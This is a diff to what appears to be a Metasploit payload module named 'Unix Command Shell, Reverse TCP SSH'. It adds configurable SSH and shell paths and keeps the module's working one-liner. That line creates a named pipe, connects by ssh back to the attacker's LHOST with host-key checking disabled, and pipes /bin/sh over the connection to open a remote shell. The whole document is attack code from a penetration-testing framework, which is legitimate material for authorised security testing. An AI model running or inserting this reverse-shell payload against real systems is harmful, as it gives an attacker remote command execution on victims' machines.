@@ -14,20 +14,20 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Reverse TCP SSH',
-      'Description' => 'Connect back and create a command shell via SSH',
-      'Author'      => [
-        'RageLtMan <rageltman[at]sempervictus>', # Rex/Metasploit
-        'hirura' # HrrRbSsh
-      ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'unix',
-      'Arch'        => ARCH_CMD,
-      'Handler'     => Msf::Handler::ReverseSsh,
-      'Session'     => Msf::Sessions::SshCommandShellReverse,
-      'PayloadType' => 'cmd',
-      'RequiredCmd' => 'ssh',
-      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
+     'Name'        => 'Unix Command Shell, Reverse TCP SSH',
+     'Description' => 'Connect back and create a command shell via SSH',
+     'Author'      => [
+       'RageLtMan <rageltman[at]sempervictus>', # Rex/Metasploit
+       'hirura' # HrrRbSsh
+     ],
+     'License'     => MSF_LICENSE,
+     'Platform'    => 'unix',
+     'Arch'        => ARCH_CMD,
+     'Handler'     => Msf::Handler::ReverseSsh,
+     'Session'     => Msf::Sessions::SshCommandShellReverse,
+     'PayloadType' => 'cmd',
+     'RequiredCmd' => 'ssh',
+     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
     register_advanced_options(
       [
@@ -35,7 +35,9 @@ module MetasploitModule
           false,
           "Space separated options for the ssh client",
           'UserKnownHostsFile=/dev/null StrictHostKeyChecking=no'
-        ])
+        ]),
+        OptString.new('SSHPath', [true, 'The path to the SSH executable', 'ssh']),
+        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
       ]
     )
   end
@@ -43,7 +45,7 @@ module MetasploitModule
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     return super + command_string
   end
 
@@ -54,6 +56,6 @@ module MetasploitModule
     backpipe = Rex::Text.rand_text_alpha_lower(4..8)
     lport = datastore['LPORT'] == 22 ? '' : "-p #{datastore['LPORT']} "
     opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = "-o #{e} " }.join
-    "mkfifo /tmp/#{backpipe};ssh -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
+    "mkfifo /tmp/#{backpipe};#{datastore['SSHPath']} -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|#{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
   end
 end
